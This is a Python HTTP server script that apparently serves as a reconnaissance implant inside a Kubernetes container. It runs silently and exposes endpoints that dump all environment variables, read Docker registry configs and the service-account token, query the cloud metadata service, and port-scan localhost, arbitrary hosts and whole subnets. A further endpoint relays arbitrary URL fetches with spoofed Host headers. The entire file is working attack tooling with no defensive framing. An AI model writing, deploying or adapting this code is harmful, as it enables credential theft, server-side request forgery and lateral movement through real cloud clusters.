import http.server
import subprocess
import json
import os
import urllib.request
import urllib.error
import socket
import threading
import time

class Handler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # suppress logs
        
    def do_GET(self):
        if self.path == '/probe':
            result = {}
            try:
                result['etc_docker_ls'] = subprocess.run(['ls', '-laR', '/etc/docker/'], capture_output=True, text=True, timeout=5).stdout
            except:
                result['etc_docker_ls'] = 'not found'
            try:
                result['etc_docker_config'] = open('/etc/docker/config.json').read()
            except:
                result['etc_docker_config'] = 'not found'
            try:
                result['find_docker'] = subprocess.run(['find', '/', '-name', 'config.json', '-path', '*/docker*'], capture_output=True, text=True, timeout=10).stdout
            except:
                result['find_docker'] = 'error'
            result['env'] = {k:v for k,v in os.environ.items() if 'DOCKER' in k.upper() or 'REGISTRY' in k.upper() or 'MIRROR' in k.upper()}
            self._json_response(result)
        elif self.path.startswith('/fetch?'):
            params = {}
            for p in self.path.split('?',1)[1].split('&'):
                if '=' in p:
                    k,v = p.split('=',1)
                    params[k] = urllib.parse.unquote(v)
            target_url = params.get('url', '')
            custom_host = params.get('host', '')
            result = {'target': target_url, 'custom_host': custom_host}
            try:
                req = urllib.request.Request(target_url)
                if custom_host:
                    req.add_header('Host', custom_host)
                resp = urllib.request.urlopen(req, timeout=5)
                body = resp.read(65536).decode('utf-8', errors='replace')
                result['status'] = resp.status
                result['headers'] = dict(resp.headers)
                result['body'] = body[:32768]
            except urllib.error.HTTPError as e:
                result['status'] = e.code
                result['headers'] = dict(e.headers)
                try:
                    result['body'] = e.read(32768).decode('utf-8', errors='replace')
                except:
                    result['body'] = 'read error'
            except urllib.error.URLError as e:
                result['error'] = str(e.reason)
            except socket.timeout:
                result['error'] = 'timeout'
            except Exception as e:
                result['error'] = str(e)
            self._json_response(result)
        elif self.path == '/scan':
            result = {}
            ports = [15000,15001,15004,15006,15020,15021,15090,9090,9091,8080,8443,80,443,8081,3000,6443,10250,10255,10256,2379]
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    r = s.connect_ex(('127.0.0.1', port))
                    result[str(port)] = 'OPEN' if r == 0 else 'closed'
                    s.close()
                except:
                    result[str(port)] = 'error'
            self._json_response(result)
        elif self.path.startswith('/portscan?'):
            params = {}
            for p in self.path.split('?',1)[1].split('&'):
                if '=' in p:
                    k,v = p.split('=',1)
                    params[k] = v
            host = params.get('host', '127.0.0.1')
            ports = [int(x) for x in params.get('ports', '80,443,8080').split(',')]
            timeout_s = float(params.get('timeout', '1'))
            result = {'host': host, 'ports': {}}
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout_s)
                    r = s.connect_ex((host, port))
                    result['ports'][str(port)] = 'OPEN' if r == 0 else 'closed'
                    s.close()
                except Exception as e:
                    result['ports'][str(port)] = f'error: {e}'
            self._json_response(result)
        elif self.path.startswith('/netscan'):
            # Scan a subnet for open ports: /netscan?subnet=10.244.25&ports=8080,80&start=1&end=254
            params = {}
            if '?' in self.path:
                for p in self.path.split('?',1)[1].split('&'):
                    if '=' in p:
                        k,v = p.split('=',1)
                        params[k] = v
            subnet = params.get('subnet', '10.244.25')
            ports = [int(x) for x in params.get('ports', '8080').split(',')]
            start = int(params.get('start', '1'))
            end = int(params.get('end', '20'))
            timeout_s = float(params.get('timeout', '0.5'))
            
            results = {}
            def scan_host(ip, ports):
                host_result = {}
                for port in ports:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(timeout_s)
                        r = s.connect_ex((ip, port))
                        if r == 0:
                            host_result[str(port)] = 'OPEN'
                        s.close()
                    except:
                        pass
                if host_result:
                    results[ip] = host_result
            
            threads = []
            for i in range(start, min(end+1, start+255)):
                ip = f"{subnet}.{i}"
                t = threading.Thread(target=scan_host, args=(ip, ports))
                t.start()
                threads.append(t)
                if len(threads) >= 20:
                    for t in threads:
                        t.join(timeout=3)
                    threads = []
            for t in threads:
                t.join(timeout=3)
            
            self._json_response({'my_ip': socket.gethostbyname(socket.gethostname()), 'scanned': f"{subnet}.{start}-{end}", 'ports': ports, 'open_hosts': results})
        elif self.path == '/env':
            self._json_response(dict(os.environ))
        elif self.path == '/net':
            result = {}
            try:
                result['hostname'] = socket.gethostname()
                result['fqdn'] = socket.getfqdn()
                result['ip'] = socket.gethostbyname(socket.gethostname())
            except:
                pass
            try:
                result['ifconfig'] = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=5).stdout
            except:
                result['ifconfig'] = 'not available'
            try:
                result['resolv'] = open('/etc/resolv.conf').read()
            except:
                pass
            try:
                result['hosts'] = open('/etc/hosts').read()
            except:
                pass
            try:
                result['routes'] = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5).stdout
            except:
                pass
            try:
                result['proc_net_tcp'] = open('/proc/net/tcp').read()[:4096]
            except:
                pass
            # Service account token
            try:
                result['sa_token'] = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read()[:200]
            except:
                result['sa_token'] = 'not found'
            try:
                result['sa_ca'] = 'exists' if os.path.exists('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt') else 'not found'
            except:
                pass
            try:
                result['sa_namespace'] = open('/var/run/secrets/kubernetes.io/serviceaccount/namespace').read()
            except:
                result['sa_namespace'] = 'not found'
            self._json_response(result)
        elif self.path == '/metadata':
            result = {}
            for url in ['http://169.254.169.254/', 'http://169.254.169.254/metadata/v1/', 'http://169.254.169.254/metadata/v1/id']:
                try:
                    req = urllib.request.Request(url)
                    resp = urllib.request.urlopen(req, timeout=3)
                    result[url] = {'status': resp.status, 'body': resp.read(4096).decode('utf-8', errors='replace')}
                except urllib.error.HTTPError as e:
                    result[url] = {'status': e.code, 'body': e.read(2048).decode('utf-8', errors='replace')}
                except Exception as e:
                    result[url] = {'error': str(e)}
            self._json_response(result)
        elif self.path.startswith('/dns?'):
            # DNS lookup: /dns?name=kubernetes.default.svc.cluster.local
            params = {}
            for p in self.path.split('?',1)[1].split('&'):
                if '=' in p:
                    k,v = p.split('=',1)
                    params[k] = v
            name = params.get('name', 'kubernetes.default')
            result = {'query': name}
            try:
                result['resolve'] = socket.getaddrinfo(name, None)
                result['ips'] = list(set(r[4][0] for r in result['resolve']))
                result['resolve'] = str(result['resolve'])
            except Exception as e:
                result['error'] = str(e)
            self._json_response(result)
        elif self.path == '/health':
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'ok')
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'Endpoints: /probe /fetch?url=&host= /scan /portscan?host=&ports=80,443&timeout=1 /netscan?subnet=X.X.X&ports=8080&start=1&end=254 /env /net /metadata /dns?name= /health')

    def _json_response(self, data):
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode())

import urllib.parse
httpd = http.server.HTTPServer(('0.0.0.0', 8080), Handler)
httpd.serve_forever()
